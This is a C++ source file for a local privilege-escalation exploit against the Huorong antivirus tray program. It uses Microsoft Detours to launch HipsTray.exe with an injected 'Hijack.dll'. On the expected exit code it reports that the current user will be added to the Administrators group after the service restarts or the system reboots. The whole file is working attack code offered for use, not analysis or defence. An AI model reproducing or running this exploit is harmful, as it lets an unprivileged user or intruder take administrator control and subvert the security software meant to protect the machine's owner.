#include "stdafx.h"
#include <Windows.h>
#include <Shlwapi.h>
#include <stdio.h>
#include "detours.h"

#pragma comment( lib, "Shlwapi.lib")
#pragma comment(lib,"detours_x86.lib")

#define HIJACK_SUCCESS 888

int _tmain(int argc, _TCHAR* argv[])
{

	char szHuorongPath[512] = "C:\\Program Files (x86)\\Huorong\\Sysdiag\\bin\\HipsTray.exe";

	if (!PathFileExistsA(szHuorongPath))
	{
		printf("[-] HipsTray file not found (%s)!",szHuorongPath);
		getchar();
		return -1;
	}

	char szDLL[MAX_PATH] = {0};
	GetModuleFileName(NULL,szDLL,MAX_PATH);
	strcpy(strrchr(szDLL,'\\')+1,"Hijack.dll");

	if (!PathFileExistsA(szDLL))
	{
		printf("[-] Hijack file not found(%s)\n",szDLL);
		getchar();
		return -1;
	}

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );

	if( !DetourCreateProcessWithDllA( NULL,szHuorongPath,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi,szDLL,NULL)) 
	{
		printf( "[-] CreateProcess failed (%d)\n", GetLastError() );
		getchar();
		return -1;
	}
	else
	{
		printf("[+] CreateProcess success\n");
	}

	WaitForSingleObject( pi.hProcess, INFINITE );

	DWORD dwExitCode = 0;
	GetExitCodeProcess(pi.hProcess,&dwExitCode);
	CloseHandle( pi.hProcess );
	CloseHandle( pi.hThread );

	if (dwExitCode==HIJACK_SUCCESS)
	{
		char szUser[128] = {0};
		DWORD dwSize = 128;
		GetUserName(szUser,&dwSize);
		printf("[+] Hijack success,%s will be added to Administrators group after Huorong services restart or system reboot\n ",szUser);
	}
	else
	{
		printf("[-] Hijack fail\n");
		getchar();
		return -1;
	}

	getchar();
	return 0;
}
